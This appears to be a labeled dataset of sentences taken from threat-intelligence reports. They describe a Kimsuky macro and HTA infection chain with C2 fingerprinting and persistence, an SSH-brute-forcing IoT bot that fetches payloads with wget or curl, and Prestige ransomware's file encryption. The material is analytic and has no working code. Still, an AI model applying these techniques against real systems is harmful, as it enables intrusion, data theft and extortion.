1	Allowing the macro in the malicious Word document to run leads the victim to fetch and execute an HTML Application (.HTA) payload.
1	The fetched HTA file has two main goals: reporting the victim information to the C2 server and creating a scheduled task for auto-execution.
1	The Kimsuky group tends to heavily reuse their code in various scripts; for instance, Visual Basic applications in macros, Visual Basic scripts and HTML applications.
1	The sent data contains the ProgramFiles folder path, antivirus name, recently opened file list, user name, OS name, OS version, Microsoft office version, .NET framework version, the file list from the Desktop folder, and a list of user-pinned taskbar items.
1	When the script delivers the collected information to the C2 server, it uses /info.php?ki87ujhy= format, the Kimsuky groups usual URL format for fingerprinting.
1	Notably, it uses a hard-coded user-agent, including the intentionally misspelled word Chnome.
1	After looking at the server-side script, we understand why they use Chnome and not Chrome.
1	Apart from the reporting capability, the fetched script downloads an additional payload and registers it with a persistence mechanism.
1	This code is also heavily used in other Kimsuky scripts and fetches the payload through s.php, saving it to the defs.ini file, registering the file as a Windows schedule, with the name OneDrive Clean in this case.
1	During our research, we discovered a corresponding C2 script (s.php) for delivering a payload for auto-execution.
1	The primary objectives of the delivered VBS payload are connecting to the legitimate blog, parsing the post and finally acquiring the next stage payload.
1	Interestingly, this C2 script generates a blog address based on the victims IP address.
1	After calculating the MD5 hash of the victims IP address, it cuts off the last 20 characters, and turns it into a blog address.
1	Additionally, the script checks whether the user-agent has an uncommon string, chnome.
1	As we mentioned earlier, the Visual Basic Script connects to this C2 script using a hard-coded chnome User-agent name and the script checks the misspelled user-agent to verify its an expected request from a real victim.
1	Unlike the earlier SSH brute-forcing campaign, the plaintext credentials are embedded into the malware instead of being downloaded from the C2.
1	To optimize brute forcing efforts, the malware compares the server prompt upon connection to a hardcoded list of strings to identify the possible device and then only tries the known credentials for that device.
1	This campaign seems especially interested in older devices with the Qualcomm MDM9625 chipset, such as LTE modems.
1	It attempts to specifically gain root access to these devices via a default password, despite having the same credentials in the list embedded in the binary.
1	Like the earlier SSH brute-forcing campaign, once it has successfully gained access, it sends the credentials used, the compromised devices IP address, and its architecture to the C2 server on a separate port, 5123.
1	After reporting, the malware attempts to install its main payload binary on the compromised device.
1	It first parses the Executable and Linkable Format (ELF) header of the /bin/busybox file for the e_machine field, which provides the architecture of the compromised device.
1	The bot then downloads its payload via software installed on the compromised device, such as ftpget, wget, curl, or tftp, before executing the payload.
1	The binary downloaders are written by echoing the bytes and piping the content to a file in the victim system.
1	As labeled in Figure 4, each binary has a hardcoded URL for downloading the payload binary of the proper architecture.
1	To encrypt files, Prestige Ransomware leverages the following public key.
1	Using Blob Analyzer from CryptoTester, the public key was identified as RSA Key.
1	Prestige Ransomware leverages the Crypto++ library during the encryption of files.
1	As it can be observed, Prestige Ransomware references multiple encryption algorithms such as AES and DES as shown below.
1	Prestige Ransomware traverses the directories, files, and processes to encrypt the content of files that have one of the hardcoded file extensions.
1	Prestige Ransomware enumerates through the directories and files through file APIs.
1	Prestige Ransomware uses reg.exe commands to register a custom file extension handler for files with .enc file extension.
1	Prestige Ransomware attempts to stop the MSSQL Windows service before encrypting the files using the net.exe command.
1	Prestige Ransomware reads the files before encryption.
1	Acquire the Crypto++ library as a container during the CryptAcquireContextA API call before the start of the encryption process.
1	Moves the file pointer of the specified file using SetFilePointerEx API.
1	Prestige Ransomware writes the encrypted data using WriteFile API.
1	After encrypting each file, the Prestige Ransomware appends the extension .enc to the existing extension of the file.
1	When a user tries to open encrypted files having file extension .enc, the custom file extension handler invokes Notepad to open C:\Users\Public\README which displays the ransom note YOU PERSONAL FILES HAVE BEEN ENCRYPTED describing what happened to the compromised system and includes an email address [emailprotected] to conduct ransom negotiations.
